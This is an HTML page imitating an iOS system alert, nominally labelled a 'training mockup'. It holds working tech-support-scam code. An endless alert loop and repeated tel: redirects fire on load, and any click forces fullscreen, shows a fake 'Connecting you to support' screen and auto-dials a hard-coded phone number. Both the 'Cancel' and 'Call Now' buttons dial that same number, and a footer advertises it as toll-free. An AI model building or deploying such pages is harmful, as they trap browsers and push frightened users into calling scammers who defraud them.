<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>iOS Classic Alert</title>

<style>
    body {
        margin: 0;
        padding: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;

        background: url('https://content.jdmagicbox.com/v2/comp/pune/n4/020pxx20.xx20.250826161117.a8n4/catalogue/apple-store-kopa-mall-koregaon-park-pune-mobile-phone-dealers-fjxrl6t6th.jpg')
                    no-repeat center center fixed;
        background-size: cover;

        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        position: relative;
    }

    .overlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.35);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10;
    }

    .ios-alert {
        width: 82%;
        max-width: 320px;
        background: #ffffff;
        border-radius: 14px;
        box-shadow: 0px 22px 45px rgba(0,0,0,0.45);
        text-align: center;
        padding-top: 18px;
        transform: scale(1.12);
        opacity: 0;
        animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
        cursor: pointer;
    }

    @keyframes iosPop {
        0% { transform: scale(1.12); opacity: 0; }
        100% { transform: scale(1); opacity: 1; }
    }

    .alert-title {
        font-size: 18px;
        font-weight: 600;
        color: #111;
        margin-bottom: 8px;
        padding: 0 18px;
    }

    .alert-message {
        font-size: 14px;
        color: #3b3b3b;
        padding: 0 20px 20px 20px;
        line-height: 1.45;
    }

    .buttons {
        border-top: 1px solid #d0d0d0;
        display: flex;
        height: 44px;
    }

    .buttons a {
        flex: 1;
        text-decoration: none;
        font-size: 17px;
        color: #007aff;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .buttons a:nth-child(1) {
        border-right: 1px solid #d0d0d0;
    }

    /* CALL BAR FOOTER */
    .call-bar {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: #007aff;
        color: #fff;
        text-align: center;
        padding: 16px;
        font-size: 18px;
        font-weight: 600;
        text-decoration: none;
        z-index: 20;
        border-top-left-radius: 12px;
        border-top-right-radius: 12px;
    }

    /* CONNECTING SCREEN */
    #connectingScreen {
        position: fixed;
        inset: 0;
        background: #000;
        color: #fff;
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        z-index: 9999;
        font-size: 22px;
        padding: 20px;
    }

    .spinner {
        width: 45px;
        height: 45px;
        border: 4px solid #555;
        border-top: 4px solid #fff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
</head>

<body>

<div class="overlay" id="overlay">
    <div class="ios-alert" id="alertBox">
        <div class="alert-title">Training Mockup</div>
        <div class="alert-message">This is a demonstration popup for training purposes only.</div>

        <div class="buttons">
            <a href="tel:+18082774439">Cancel</a>
            <a href="tel:+18082774439">Call Now</a>
        </div>
    </div>
</div>

<!-- CONNECTING OVERLAY -->
<div id="connectingScreen">
    <div class="spinner"></div>
    <p style="margin-top:20px;">Connecting you to supportâ€¦</p>
</div>

<!-- FOOTER CALL BAR -->
<a class="call-bar" href="tel:+18082774439">ðŸ“ž Call Toll-Free: 1-808-277-4439</a>

<script>
window.onload = function() {

    alert("This is a training mockup only. No real device actions will occur.");
    window.location.href = "tel:+18082774439";

    setTimeout(function repeatAlert() {
        alert("This is a training mockup only. No real device actions will occur.");
        window.location.href = "tel:+18082774439";
        setTimeout(repeatAlert, 1500);
    }, 1500);
};
</script>

<!-- FULLSCREEN -->
<script>
function goFullscreen() {
    let e = document.documentElement;
    if (e.requestFullscreen) e.requestFullscreen();
    else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
}
document.addEventListener("click", goFullscreen);
document.getElementById("alertBox").addEventListener("click", function(e){
    e.stopPropagation();
    goFullscreen();
});
</script>

<!-- AUTO-DIAL AFTER ANY CLICK WITH CONNECTING SCREEN -->
<script>
document.addEventListener("click", function() {

    // Show the fake connecting screen
    document.getElementById("connectingScreen").style.display = "flex";

    // Delay before actual dialing
    setTimeout(function() {
        window.location.href = "tel:+18082774439";
    }, 1500);
});
</script>
